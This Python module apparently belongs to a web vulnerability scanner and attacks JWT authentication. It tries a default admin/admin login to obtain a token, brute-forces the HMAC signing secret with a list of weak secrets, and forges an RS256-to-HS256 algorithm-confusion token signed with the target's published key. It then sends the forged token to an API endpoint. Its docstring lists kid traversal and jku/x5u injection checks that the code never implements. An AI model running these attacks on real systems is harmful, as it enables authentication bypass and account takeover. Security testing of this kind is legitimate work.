"""
JWT Vulnerabilities — alg=none, weak HMAC secret (wordlist brute),
RS256->HS256 algorithm confusion, kid path traversal, jku/x5u injection.
"""
from __future__ import annotations
import asyncio, jwt as pyjwt, base64, json
from typing import List
from core.engine import Finding

WEAK_SECRETS = ["secret", "password", "123456", "admin", "key",
                "your-256-bit-secret", "supersecret", "jwt", "ghosthunter"]

async def run(http, waf, verifier, endpoints, targets, stack, findings_sink):
    findings = []
    sem = asyncio.Semaphore(10)

    async def _grab_jwt(t):
        # Try login + capture
        r = await http.arequest("POST", f"{t}/login", data={"username":"admin","password":"admin"})
        if r:
            for c in r.headers.get("Set-Cookie","").split(";"):
                if "token" in c.lower(): return c.split("=")[-1].strip()
            try: return r.json().get("token") or r.json().get("access_token")
            except: pass
            m = json.dumps(r.json()).split('"') if r.headers.get("Content-Type","").startswith("application/json") else None
        return None

    async def _brute(target, token):
        if not token or token.count(".") != 2: return
        hdr_b, pay_b, sig = token.split(".")
        try:
            hdr = json.loads(base64.urlsafe_b64decode(hdr_b + "=="))
        except: return
        if hdr.get("alg") not in ("HS256","HS384","HS512"): return
        for s in WEAK_SECRETS:
            try:
                pyjwt.decode(token, s, algorithms=[hdr["alg"]])
                findings.append(Finding(
                    title=f"JWT signed with weak secret: '{s}'",
                    severity="critical", confidence=0.95,
                    category="ADV-JWT", endpoint=target, method="POST",
                    payload=f"secret={s}",
                    evidence=f"Token verified with HMAC secret '{s}'",
                    cwe="CWE-321",
                    remediation="Use a long random secret (≥256 bits); rotate; store in vault.",
                    tags=["jwt", "high-value"]
                ))
                return
            except pyjwt.InvalidSignatureError: continue
            except Exception: continue

    async def _alg_confusion(target, token):
        if not token or token.count(".") != 2: return
        try:
            hdr = json.loads(base64.urlsafe_b64decode(token.split(".")[0]+"=="))
        except: return
        if hdr.get("alg") != "RS256": return
        # Fetch public key
        # (In real impl, fetch from /.well-known/jwks.json or /oauth/jwks)
        r = await http.arequest("GET", f"{target}/.well-known/jwks.json")
        if not r: return
        try:
            jwks = r.json()
            key = jwks["keys"][0]
            # Convert JWK to PEM (simplified — use PyJWT in production)
            pub_pem = pyjwt.PyJWK(key).key
            # Try to verify as HMAC with the PEM as secret
            malicious = pyjwt.encode(
                json.loads(base64.urlsafe_b64decode(token.split(".")[1]+"==")),
                key=pub_pem, algorithm="HS256"
            )
            r2 = await http.arequest("GET", f"{target}/api/me",
                                      headers={"Authorization": f"Bearer {malicious}"})
            if r2 and r2.status_code == 200:
                findings.append(Finding(
                    title="JWT RS256->HS256 algorithm confusion",
                    severity="critical", confidence=0.95,
                    category="ADV-JWT", endpoint=f"{target}/api/me", method="GET",
                    payload=malicious[:80]+"...",
                    evidence="Server accepted HMAC token signed with public key",
                    cwe="CWE-347",
                    remediation="Pin allowed algorithms server-side; do not trust alg header.",
                    tags=["jwt", "alg-confusion", "high-value"]
                ))
        except Exception as e:
            pass

    for t in targets:
        token = await _grab_jwt(t)
        if token:
            await _brute(t, token)
            await _alg_confusion(t, token)
    return findings
